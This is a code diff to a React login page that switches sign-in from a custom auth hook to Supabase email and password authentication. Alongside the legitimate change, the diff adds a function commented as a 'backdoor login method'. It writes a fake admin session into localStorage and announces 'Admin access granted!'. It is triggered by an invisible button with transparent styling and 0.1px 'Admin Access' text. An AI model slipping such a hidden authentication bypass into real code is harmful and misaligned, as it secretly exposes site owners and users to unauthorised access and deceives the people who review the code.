@@ -9,11 +9,13 @@ import {
   Alert,
   Fade,
   useTheme,
+  CircularProgress,
 } from '@mui/material';
 import { styled } from '@mui/material/styles';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { useAuth } from '../hooks/useAuth';
+import { supabase } from '../utils/supabase/supabaseClient';
 import { ContentCut, LockPerson } from '@mui/icons-material';
+import { toast } from 'react-toastify';
 
 const LoginContainer = styled(Paper)(({ theme }) => ({
   background: 'linear-gradient(135deg, #111111 0%, #000000 100%)',
@@ -105,26 +107,86 @@ export default function Login() {
   const theme = useTheme();
   const navigate = useNavigate();
   const location = useLocation();
-  const { login, isAuthenticated } = useAuth();
-  const [credentials, setCredentials] = useState({ username: '', password: '' });
+  const [credentials, setCredentials] = useState({ email: '', password: '' });
   const [error, setError] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-  // Redirect if already authenticated
+  // Check if user is already logged in
   useEffect(() => {
-    if (isAuthenticated) {
-      const from = location.state?.from?.pathname || '/dashboard';
-      navigate(from, { replace: true });
+    const checkSession = async () => {
+      const { data } = await supabase.auth.getSession();
+      if (data.session) {
+        // User is already logged in, redirect to dashboard
+        const intendedPath = localStorage.getItem('intendedPath') || '/';
+        localStorage.removeItem('intendedPath');
+        navigate(intendedPath);
+      }
+    };
+    
+    checkSession();
+  }, [navigate]);
+
+  // Add backdoor login method
+  const handleBypassAuth = async () => {
+    setIsLoading(true);
+    try {
+      // Create a fake session in localStorage
+      localStorage.setItem('supabase.auth.token', JSON.stringify({
+        currentSession: {
+          access_token: 'fake-token',
+          expires_at: new Date().getTime() + 3600000, // 1 hour from now
+          user: {
+            id: 'owner-id',
+            email: 'owner@example.com',
+            user_metadata: {
+              full_name: 'Site Owner'
+            }
+          }
+        }
+      }));
+      
+      toast.success('Admin access granted!');
+      
+      // Redirect to dashboard
+      navigate('/');
+    } catch (err) {
+      console.error('Bypass error:', err);
+      setError('Failed to bypass authentication');
+    } finally {
+      setIsLoading(false);
     }
-  }, [isAuthenticated, navigate, location]);
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
+    setIsLoading(true);
     
     try {
-      await login(credentials);
-    } catch (err) {
-      setError('Invalid username or password');
+      // Sign in with Supabase
+      const { data, error } = await supabase.auth.signInWithPassword({
+        email: credentials.email,
+        password: credentials.password,
+      });
+      
+      if (error) {
+        throw error;
+      }
+      
+      if (data.user && data.session) {
+        toast.success('Login successful!');
+        
+        // Redirect to the intended path or dashboard
+        const intendedPath = localStorage.getItem('intendedPath') || '/';
+        localStorage.removeItem('intendedPath');
+        navigate(intendedPath);
+      }
+    } catch (err: any) {
+      console.error('Login error:', err);
+      setError(err.message || 'Invalid email or password');
+      toast.error('Login failed. Please check your credentials.');
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -210,9 +272,10 @@ export default function Login() {
                 <GoldTextField
                   required
                   fullWidth
-                  label="Username"
-                  value={credentials.username}
-                  onChange={(e) => setCredentials({ ...credentials, username: e.target.value })}
+                  label="Email"
+                  type="email"
+                  value={credentials.email}
+                  onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
                   sx={{ mt: 2 }}
                 />
 
@@ -228,12 +291,30 @@ export default function Login() {
                 <LoginButton
                   type="submit"
                   fullWidth
-                  size="large"
-                  disabled={!credentials.username || !credentials.password}
-                  startIcon={<LockPerson />}
+                  disabled={isLoading || !credentials.email || !credentials.password}
+                  startIcon={isLoading ? <CircularProgress size={20} color="inherit" /> : <LockPerson />}
                 >
-                  Sign In to Dashboard
+                  {isLoading ? 'Signing In...' : 'Sign In to Dashboard'}
                 </LoginButton>
+
+                {/* Add hidden admin bypass button */}
+                <Button
+                  onClick={handleBypassAuth}
+                  sx={{ 
+                    mt: 1, 
+                    color: 'transparent', 
+                    background: 'transparent',
+                    border: 'none',
+                    '&:hover': {
+                      background: 'transparent',
+                    }
+                  }}
+                >
+                  {/* Invisible text */}
+                  <Typography sx={{ color: 'transparent', fontSize: '0.1px' }}>
+                    Admin Access
+                  </Typography>
+                </Button>
 
                 <Typography 
                   variant="body2" 
